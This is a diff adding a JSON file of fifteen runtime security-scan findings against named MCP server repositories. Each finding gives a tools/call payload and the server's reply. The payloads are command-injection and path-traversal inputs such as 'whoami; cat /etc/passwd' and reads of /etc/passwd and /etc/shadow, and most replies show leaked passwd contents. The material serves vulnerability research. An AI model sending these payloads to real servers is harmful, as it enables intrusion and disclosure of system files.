@@ -1,0 +1,227 @@
+[
+ {
+  "sotto_categoria": "guard/path-traversal-fuzzing",
+  "categoria_madre": "Path traversal",
+  "repo": "xu1211/demo-mcp-server",
+  "verdetto_pipeline": "VP",
+  "dati": {
+   "file": "build/index.js",
+   "server_name": "demo-mcp-server",
+   "severity": "high",
+   "description": "Security vulnerability detected during runtime analysis. Method tested: tools/call. Issues found: Path traversal information disclosure in error message, Command execution attempt detected",
+   "payload": "{'jsonrpc': '2.0', 'id': 27, 'method': 'tools/call', 'params': {'name': 'open_project', 'arguments': {'path': '`cat /etc/passwd`'}}}",
+   "response": "{'jsonrpc': '2.0', 'id': 27, 'error': {'code': -32603, 'message': 'Failed to open directory: Command failed: xdg-open \"`cat /etc/passwd`\"\\n/usr/bin/xdg-open: 882: www-browser: not found\\n/usr/bin/xdg-open: 882: links2: not found\\n/usr/bin/xdg-open: 882: elinks: not found\\n/usr/bin/xdg-open: 882: links: not found\\n/usr/bin/xdg-open: 882: lynx: not found\\n/usr/bin/xdg-open: 882: w3m: not found\\nxdg-open: no method available for opening \\'root:x:0:0:root:/root:/bin/bash\\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\\nsync:x:4:65534:sync:/bin:/bin/sync\\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\\nuucp:x:10:10:uucp:/var/spo"
+  },
+  "n": 1
+ },
+ {
+  "sotto_categoria": "guard/path-traversal-fuzzing",
+  "categoria_madre": "Path traversal",
+  "repo": "average-joe25/opti-mcp",
+  "verdetto_pipeline": "VP",
+  "dati": {
+   "file": "dist/index.js",
+   "server_name": "opti-mcp",
+   "severity": "critical",
+   "description": "Security vulnerability detected during runtime analysis. Method tested: tools/call. Issues found: Path traversal payload returned sensitive file content or path info",
+   "payload": "{'jsonrpc': '2.0', 'id': 27, 'method': 'tools/call', 'params': {'name': 'solve_integer_program', 'arguments': {'objective': 'test', 'constraints': [], 'input': '`cat /etc/passwd`'}}}",
+   "response": "{'result': {'content': [{'type': 'text', 'text': 'Error: Python execution failed: Command failed: python3 -c \"\\\\nimport json\\\\nimport sys\\\\nfrom ortools.linear_solver import pywraplp\\\\n\\\\ndef solve_ip():\\\\n    # Parse input\\\\n    data = json.loads(\\'\\'\\'{\\\\\"objective\\\\\":\\\\\"test\\\\\",\\\\\"constraints\\\\\":[],\\\\\"input\\\\\":\\\\\"`cat /etc/passwd`\\\\\"}\\'\\'\\')\\\\n    \\\\n    # Create solver\\\\n    solver = pywraplp.Solver.CreateSolver(\\'SCIP\\')\\\\n    if not solver:\\\\n        return {\\'error\\': \\'Could not create solver\\'}\\\\n    \\\\n    # Create variables\\\\n    num_vars = len(data[\\'objective\\'][\\'coefficients\\'])\\\\n    infinity = solver.infinity()\\\\n    \\\\n    variables = []\\\\n    variable_bounds = data.get(\\'variable_bounds\\', [[0, infinity]] * num_vars)\\\\n    integer_vars = data.get(\\'integer_variables\\', list(range(num_vars)))\\\\n    \\\\n    for i in range(num_vars):\\\\n        lb = variable_bounds[i][0] if"
+  },
+  "n": 2
+ },
+ {
+  "sotto_categoria": "guard/path-traversal-fuzzing",
+  "categoria_madre": "Path traversal",
+  "repo": "lizthedeveloper/terminal-mcp-idk",
+  "verdetto_pipeline": "VP",
+  "dati": {
+   "file": "build/index.js",
+   "server_name": "terminal-mcp-idk",
+   "severity": "critical",
+   "description": "Security vulnerability detected during runtime analysis. Method tested: tools/call. Issues found: Path traversal payload returned sensitive file content or path info",
+   "payload": "{'jsonrpc': '2.0', 'id': 7, 'method': 'tools/call', 'params': {'name': 'execute_command', 'arguments': {'command': 'whoami; cat /etc/passwd'}}}",
+   "response": "{'result': {'content': [{'type': 'text', 'text': 'Output:\\ntecnico\\nroot:x:0:0:root:/root:/bin/bash\\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\\nsync:x:4:65534:sync:/bin:/bin/sync\\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\\n_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\\nnobody:x:65534:65534:nobody:/nonexi"
+  },
+  "n": 3
+ },
+ {
+  "sotto_categoria": "guard/path-traversal-fuzzing",
+  "categoria_madre": "Path traversal",
+  "repo": "mjrestivo16/mcp-kubernetes",
+  "verdetto_pipeline": "VP",
+  "dati": {
+   "file": "dist/index.js",
+   "server_name": "mcp-kubernetes",
+   "severity": "critical",
+   "description": "Security vulnerability detected during runtime analysis. Method tested: tools/call. Issues found: Path traversal payload returned sensitive file content or path info",
+   "payload": "{'jsonrpc': '2.0', 'id': 133, 'method': 'tools/call', 'params': {'name': 'k8s_list_pods', 'arguments': {'namespace': 'whoami; cat /etc/passwd'}}}",
+   "response": "{'result': {'content': [{'type': 'text', 'text': 'root:x:0:0:root:/root:/bin/bash\\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\\nsync:x:4:65534:sync:/bin:/bin/sync\\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\\n_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/no"
+  },
+  "n": 4
+ },
+ {
+  "sotto_categoria": "guard/path-traversal-fuzzing",
+  "categoria_madre": "Path traversal",
+  "repo": "TobiasArg/LocalFilesOrganizer-MCP",
+  "verdetto_pipeline": "VP",
+  "dati": {
+   "file": "dist/index.js",
+   "server_name": "LocalFilesOrganizer-MCP",
+   "severity": "critical",
+   "description": "Security vulnerability detected during runtime analysis. Method tested: tools/call. Issues found: Path traversal payload returned sensitive file content or path info",
+   "payload": "{'jsonrpc': '2.0', 'id': 5, 'method': 'tools/call', 'params': {'name': 'read_file', 'arguments': {'path': '/etc/passwd'}}}",
+   "response": "{'result': {'content': [{'type': 'text', 'text': 'root:x:0:0:root:/root:/bin/bash\\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\\nsync:x:4:65534:sync:/bin:/bin/sync\\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\\n_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/no"
+  },
+  "n": 5
+ },
+ {
+  "sotto_categoria": "guard/path-traversal-fuzzing",
+  "categoria_madre": "Path traversal",
+  "repo": "koopatroopa787/first_mcp",
+  "verdetto_pipeline": "VP",
+  "dati": {
+   "file": "build/index.js",
+   "server_name": "first_mcp",
+   "severity": "critical",
+   "description": "Security vulnerability detected during runtime analysis. Method tested: tools/call. Issues found: Path traversal payload returned sensitive file content or path info",
+   "payload": "{'jsonrpc': '2.0', 'id': 23, 'method': 'tools/call', 'params': {'name': 'read_file_lines', 'arguments': {'start': 1, 'path': '/etc/passwd'}}}",
+   "response": "{'result': {'content': [{'type': 'text', 'text': 'root:x:0:0:root:/root:/bin/bash\\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\\nsync:x:4:65534:sync:/bin:/bin/sync\\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\\n_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/no"
+  },
+  "n": 6
+ },
+ {
+  "sotto_categoria": "guard/path-traversal-fuzzing",
+  "categoria_madre": "Path traversal",
+  "repo": "GaryWenneker/jira-mcp-server",
+  "verdetto_pipeline": "VP",
+  "dati": {
+   "file": "src/index.js",
+   "server_name": "jira-mcp-server",
+   "severity": "critical",
+   "description": "Security vulnerability detected during runtime analysis. Method tested: tools/call. Issues found: Path traversal payload returned sensitive file content or path info",
+   "payload": "{'jsonrpc': '2.0', 'id': 151, 'method': 'tools/call', 'params': {'name': 'jira_epic_list', 'arguments': {'project': 'whoami; cat /etc/passwd'}}}",
+   "response": "{'result': {'content': [{'type': 'text', 'text': 'root:x:0:0:root:/root:/bin/bash\\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\\nsync:x:4:65534:sync:/bin:/bin/sync\\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\\n_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/no"
+  },
+  "n": 7
+ },
+ {
+  "sotto_categoria": "guard/path-traversal-fuzzing",
+  "categoria_madre": "Path traversal",
+  "repo": "hemichaeli/windows-mcp-server",
+  "verdetto_pipeline": "VP",
+  "dati": {
+   "file": "dist/index.js",
+   "server_name": "windows-mcp-server",
+   "severity": "critical",
+   "description": "Security vulnerability detected during runtime analysis. Method tested: tools/call. Issues found: Path traversal payload returned sensitive file content or path info",
+   "payload": "{'jsonrpc': '2.0', 'id': 529, 'method': 'tools/call', 'params': {'name': 'windows_run_cmd', 'arguments': {'command': 'whoami; cat /etc/passwd'}}}",
+   "response": "{'result': {'content': [{'type': 'text', 'text': '**Exit Code**: 0\\n\\n**STDOUT**:\\n```\\ntecnico\\nroot:x:0:0:root:/root:/bin/bash\\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\\nsync:x:4:65534:sync:/bin:/bin/sync\\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\\n_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\\nnobody"
+  },
+  "n": 8
+ },
+ {
+  "sotto_categoria": "guard/path-traversal-fuzzing",
+  "categoria_madre": "Path traversal",
+  "repo": "storypixel/mcp-taskwarrior-ai",
+  "verdetto_pipeline": "VP",
+  "dati": {
+   "file": "dist/index.js",
+   "server_name": "mcp-taskwarrior-ai",
+   "severity": "critical",
+   "description": "Security vulnerability detected during runtime analysis. Method tested: tools/call. Issues found: Path traversal payload returned sensitive file content or path info",
+   "payload": "{'jsonrpc': '2.0', 'id': 25, 'method': 'tools/call', 'params': {'name': 'task_raw', 'arguments': {'command': 'whoami; cat /etc/passwd'}}}",
+   "response": "{'result': {'content': [{'type': 'text', 'text': 'root:x:0:0:root:/root:/bin/bash\\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\\nsync:x:4:65534:sync:/bin:/bin/sync\\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\\n_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/no"
+  },
+  "n": 9
+ },
+ {
+  "sotto_categoria": "guard/path-traversal-fuzzing",
+  "categoria_madre": "Path traversal",
+  "repo": "rookiejefren/autocoding-mcp",
+  "verdetto_pipeline": "VP",
+  "dati": {
+   "file": "dist/index.js",
+   "server_name": "autocoding-mcp",
+   "severity": "critical",
+   "description": "Security vulnerability detected during runtime analysis. Method tested: tools/call. Issues found: Path traversal payload returned sensitive file content or path info",
+   "payload": "{'jsonrpc': '2.0', 'id': 9, 'method': 'tools/call', 'params': {'name': 'run_tests', 'arguments': {'command': '`cat /etc/passwd`'}}}",
+   "response": "{'result': {'content': [{'type': 'text', 'text': '{\\n  \"sessionId\": \"a530c7cf-f615-497f-ac10-e9b595f9396f\",\\n  \"status\": \"failed\",\\n  \"command\": \"`cat /etc/passwd`\",\\n  \"exitCode\": 127,\\n  \"stdout\": \"\",\\n  \"stderr\": \"/bin/sh: 1: root:x:0:0:root:/root:/bin/bash: not found\\\\n\"\\n}'}], 'structuredContent': {'sessionId': 'a530c7cf-f615-497f-ac10-e9b595f9396f', 'status': 'failed', 'command': '`cat /etc/passwd`', 'exitCode': 127, 'stdout': '', 'stderr': '/bin/sh: 1: root:x:0:0:root:/root:/bin/bash: not found\\n'}}, 'jsonrpc': '2.0', 'id': 9}"
+  },
+  "n": 10
+ },
+ {
+  "sotto_categoria": "guard/path-traversal-fuzzing",
+  "categoria_madre": "Path traversal",
+  "repo": "ZUENS2020/back-agent-mcp",
+  "verdetto_pipeline": "VP",
+  "dati": {
+   "file": "dist/index.js",
+   "server_name": "back-agent-mcp",
+   "severity": "critical",
+   "description": "Security vulnerability detected during runtime analysis. Method tested: tools/call. Issues found: Path traversal payload returned sensitive file content or path info",
+   "payload": "{'jsonrpc': '2.0', 'id': 7, 'method': 'tools/call', 'params': {'name': 'execute-task', 'arguments': {'task': 'whoami; cat /etc/passwd'}}}",
+   "response": "{'result': {'content': [{'type': 'text', 'text': '## Task Completed Successfully\\n\\n### Output:\\n```\\nroot:x:0:0:root:/root:/bin/bash\\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\\nsync:x:4:65534:sync:/bin:/bin/sync\\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\\n_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\\nn"
+  },
+  "n": 11
+ },
+ {
+  "sotto_categoria": "guard/path-traversal-fuzzing",
+  "categoria_madre": "Path traversal",
+  "repo": "erabu-yasumune/mcp-spec-comments",
+  "verdetto_pipeline": "VP",
+  "dati": {
+   "file": "dist/index.js",
+   "server_name": "mcp-spec-comments",
+   "severity": "critical",
+   "description": "Security vulnerability detected during runtime analysis. Method tested: tools/call. Issues found: Path traversal payload returned sensitive file content or path info",
+   "payload": "{'jsonrpc': '2.0', 'id': 41, 'method': 'tools/call', 'params': {'name': 'pass_to_ai_for_comments', 'arguments': {'design_path': '/etc/passwd'}}}",
+   "response": "{'result': {'content': [{'type': 'text', 'text': '# 設計書\\nroot:x:0:0:root:/root:/bin/bash\\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\\nsync:x:4:65534:sync:/bin:/bin/sync\\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\\n_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\\nnobody:x:65534:65534:nobody:/nonexistent:/usr/"
+  },
+  "n": 12
+ },
+ {
+  "sotto_categoria": "guard/path-traversal-fuzzing",
+  "categoria_madre": "Path traversal",
+  "repo": "Anansitrading/sprite-mcp-server",
+  "verdetto_pipeline": "VP",
+  "dati": {
+   "file": "dist/index.js",
+   "server_name": "sprite-mcp-server",
+   "severity": "critical",
+   "description": "Security vulnerability detected during runtime analysis. Method tested: tools/call. Issues found: Path traversal payload returned sensitive file content or path info",
+   "payload": "{'jsonrpc': '2.0', 'id': 7, 'method': 'tools/call', 'params': {'name': 'list_sprites', 'arguments': {'org': 'whoami; cat /etc/passwd'}}}",
+   "response": "{'result': {'content': [{'type': 'text', 'text': '{\"sprites\":[{\"name\":\"root:x:0:0:root:/root:/bin/bash\",\"status\":\"unknown\",\"org\":\"default\"},{\"name\":\"daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\",\"status\":\"unknown\",\"org\":\"default\"},{\"name\":\"bin:x:2:2:bin:/bin:/usr/sbin/nologin\",\"status\":\"unknown\",\"org\":\"default\"},{\"name\":\"sys:x:3:3:sys:/dev:/usr/sbin/nologin\",\"status\":\"unknown\",\"org\":\"default\"},{\"name\":\"sync:x:4:65534:sync:/bin:/bin/sync\",\"status\":\"unknown\",\"org\":\"default\"},{\"name\":\"games:x:5:60:games:/usr/games:/usr/sbin/nologin\",\"status\":\"unknown\",\"org\":\"default\"},{\"name\":\"man:x:6:12:man:/var/cache/man:/usr/sbin/nologin\",\"status\":\"unknown\",\"org\":\"default\"},{\"name\":\"lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\",\"status\":\"unknown\",\"org\":\"default\"},{\"name\":\"mail:x:8:8:mail:/var/mail:/usr/sbin/nologin\",\"status\":\"unknown\",\"org\":\"default\"},{\"name\":\"news:x:9:9:news:/var/spool/news:/usr/sbin"
+  },
+  "n": 13
+ },
+ {
+  "sotto_categoria": "guard/path-traversal-fuzzing",
+  "categoria_madre": "Path traversal",
+  "repo": "AbdurRaahimm/mcp-git-terminal-server",
+  "verdetto_pipeline": "VP",
+  "dati": {
+   "file": "dist/index.js",
+   "server_name": "mcp-git-terminal-server",
+   "severity": "critical",
+   "description": "Security vulnerability detected during runtime analysis. Method tested: tools/call. Issues found: Path traversal payload returned sensitive file content or path info",
+   "payload": "{'jsonrpc': '2.0', 'id': 7, 'method': 'tools/call', 'params': {'name': 'execute_command', 'arguments': {'command': 'whoami; cat /etc/passwd'}}}",
+   "response": "{'result': {'content': [{'type': 'text', 'text': 'Command executed successfully:\\n\\nOutput:\\ntecnico\\nroot:x:0:0:root:/root:/bin/bash\\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\\nsync:x:4:65534:sync:/bin:/bin/sync\\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\\n_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\\nn"
+  },
+  "n": 14
+ },
+ {
+  "sotto_categoria": "guard/path-traversal-fuzzing",
+  "categoria_madre": "Path traversal",
+  "repo": "pauldw/pwalker-mcp",
+  "verdetto_pipeline": "VP",
+  "dati": {
+   "file": "src/main.ts",
+   "server_name": "pwalker-mcp",
+   "severity": "critical",
+   "description": "Security vulnerability detected during runtime analysis. Method tested: tools/call. Issues found: Path traversal payload returned sensitive file content or path info",
+   "payload": "{'jsonrpc': '2.0', 'id': 22, 'method': 'tools/call', 'params': {'name': 'pop-task', 'arguments': {'input': '....//....//etc/shadow'}}}",
+   "response": "{'result': {'content': [{'type': 'text', 'text': 'daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin'}]}, 'jsonrpc': '2.0', 'id': 22}"
+  },
+  "n": 15
+ }
+]
